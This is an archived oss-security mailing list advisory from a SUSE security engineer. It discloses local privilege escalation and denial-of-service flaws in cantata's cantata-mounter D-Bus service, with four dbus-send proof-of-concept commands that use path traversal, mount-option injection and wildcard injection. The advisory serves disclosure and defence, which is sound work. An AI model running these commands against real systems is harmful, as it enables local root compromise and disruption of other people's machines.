X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5433" "Monday" "18" "June" "2018" "11:08:36" "+0200" "Matthias Gerstner" "mgerstner@suse.de" "<20180618090836.GB8123@f195.suse.de>" "125" "[oss-security] cantata: cantata-mounter D-Bus service local privilege escalation and other security issues" "^Date:" nil nil "6" "2018061809:08:36" "[oss-security] cantata: cantata-mounter D-Bus service local privilege escalation and other security issues" (number mark "        mgerstner@su Jun 18  125/5433  " thread-indent "\"[oss-security] cantata: cantata-mounter D-Bus service local privilege escalation and other security issues\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 8162 invoked by uid 550); 18 Jun 2018 09:50:15 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 3985 invoked from network); 18 Jun 2018 09:08:52 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Message-ID: <20180618090836.GB8123@f195.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="VrqPEDrXMn8OVzN4"
Content-Disposition: inline
User-Agent: Mutt/1.9.4 (2018-02-28)
Date: Mon, 18 Jun 2018 11:08:36 +0200
From: Matthias Gerstner <mgerstner@suse.de>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] cantata: cantata-mounter D-Bus service local privilege escalation
 and other security issues
To: oss-security@lists.openwall.com

--VrqPEDrXMn8OVzN4
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello list,

this is a report about local privilege and local denial of service
issues found in cantata, a graphical client for MPD
(<https://github.com/CDrummond/cantata/wiki/About-Cantata>).

cantata supports a D-Bus helper daemon "cantata-mounter" for mounting
remote samba shares by calling `mount.cifs` on Linux systems. This
daemon is configured for on-demand activation, running as root and its
D-Bus interface is accessible by unprivileged users by default.

The daemon code is part of cantata since version 2.0.0 and it is built
by default in versions 2.3.0 and 2.3.1. Before 2.3.0 it was only built
if `-DENABLE_REMOTE_DEVICES=3DON` was passed to the cmake invocation.

Due to the issues explained below the upstream maintainer decided to
drop the D-Bus service completely from future versions. This already
happened through upstream commit afc4f8315d3e96574925fb530a7004cc9e6ce3d3.
Therefore there are no fixes available except not building and shipping
the D-Bus service in question.

Following are four distinct security issues found in the
cantata-mounter D-Bus service:

A) The mount target path check in mounter.cpp `mpOk()` is insufficient.
  A regular user can this way mount a CIFS filesystem anywhere, and not
  just beneath /home by passing relative path components. Example D-Bus
  call:

  dbus-send --system --print-reply --dest=3Dmpd.cantata.mounter /Mounter mp=
d.cantata.mounter.mount 'string:smb://workgroup\user:password@host:port/pat=
h?domain=3Ddomain' string:/home/../usr/bin int32:$$ int32:0 int32:0

  By replacing data in system paths like /usr/bin by data from an
  attacker controlled samba share, a local attacker can cause root to
  execute modified programs or to read modified configuration files.
  Therefore it opens the avenue for a local root escalation.

B) Arbitrary unmounts can be performed by regular users the same way.
  For example this D-Bus call unmounts /sys/kernel/security:

  dbus-send --system --print-reply --dest=3Dmpd.cantata.mounter /Mounter mp=
d.cantata.mounter.umount string:/home/../sys/kernel/security int32:$$

  This allows for a local denial of service and possible further
  unspecified kinds of system manipulation.

C) A regular user can inject additional mount options like file_mode=3D by
  manipulating e.g. the domain parameter of the samba URL. This D-Bus
  call injects the 'file_mode=3D777' parameter:

  dbus-send --system --print-reply --dest=3Dmpd.cantata.mounter /Mounter mp=
d.cantata.mounter.mount 'string:smb://workgroup\user@host:port/path?domain=
=3Ddomain,file_mode=3D777' string:/home/user int32:$$ int32:0 int32:0

  This way the user can use all options that mount.cifs offers to e.g.
  produce files with arbitrary ownership and mode.

D) The wrapper script 'mount.cifs.wrapper' uses the shell to forward the
  arguments to the actual mount.cifs binary. The shell evaluates
  wildcards which can also be injected like this:

  dbus-send --system --print-reply --dest=3Dmpd.cantata.mounter /Mounter mp=
d.cantata.mounter.mount 'string:smb://workgroup\user:password@host:port/pat=
h?domain=3Ddomain' 'string:/home/../tmp/*' int32:$$ int32:0 int32:0

  In this case all files in /tmp/* will be expanded and passed to
  mount.cifs as parameters. This shouldn't allow further attack vectors,
  because there are no additional arguments that mount.cifs supports.
  But it still shouldn't happen.

  The reason for "Calling mount.cifs directly from DBUS service seems to
  mess things up?" which is stated in 'mount.cifs.wrapper' most probably
  is that the D-Bus service has an empty PATH variable and can't find
  mount.cifs. At least it is this way on openSUSE Tumbleweed where I
  tested this.

Furthermore the mount D-Bus method allows unprivileged users to specify
the owner uid and gid of the mounted samba shared (passed as `uid=3D` and
`gid=3D` mount.cifs parameters). The daemon should instead determine the
callers uid and gid and use them, because this way the user can produce
files with arbitrary user and group ownership, which is normally not
possible.

Cheers

Matthias

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Dipl.-Wirtsch.-Inf. (FH), Security Engineer
https://www.suse.com/security
Telefon: +49 911 740 53 290
GPG Key ID: 0x14C405C971923553

SUSE Linux GmbH
GF: Felix Imend=F6rffer, Jane Smithard, Graham Norton
HRB 21284 (AG Nuernberg)

--VrqPEDrXMn8OVzN4
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAlsndpMACgkQFMQFyXGS
NVPIhg//fBoH2kIUNFSeZNXCw/W9fPV04oJkwEalELZLxMSWpoH8gb9AxUt0jJQv
IK6X6/5WG9GkPdMq5PBPwtJOic5kMxQRw2PKejYa2bZcuIl58uUJg4S0RreXUZcc
Z9twWfqJtEdHzNxyXwKsfck8QGNO7zEZVsG0q2zlGvcWhm0Wj6SiaAKhzBQA+whe
y9uRFef63W/hC0TvgHgM6WOxpAdQ7+NQJQhIAWqP7rvbM7r5qJ5YkURfLjZo5GGZ
XSNF7xJjSXk+w+v3i2Oy88a8wgPmopEZ11R37hEBIBACGNrB9vQurD7tQyrD8hWX
uZGEIdpmDrnRNCq/TiI5qZ7Pg76i4nfXqfehjhAn57je0pylwxnVxKtMi1cp97uw
SXHQ45EVHQLoaj3xok1WH80n55E8vd31JzHwnmkuke824HsrQeoe1yCxhyROsbA3
9pIUqVBbGNjHRcMlqrEdpX6GJzxQAupYZWQOgXCeHZloXVr6qBQwEoL2KtkwRYAp
KpD+MZANmDdGW6Uk/GMQEhLQIKTfwUW5ftjdnae/A2uTGIC5mZSBOe9uF1OX7e4O
qTN4iOUVRzDmxiQgIwpo7iXArF1HIeId8vzvjtUbQC9WapPeeGCSrcQ7ld8epnoa
7gNp8HDoQ35kDvA7YGx/QdSVOFe9bkb9cWFvSwTk72l/u91CXss=
=Y2ps
-----END PGP SIGNATURE-----

--VrqPEDrXMn8OVzN4--
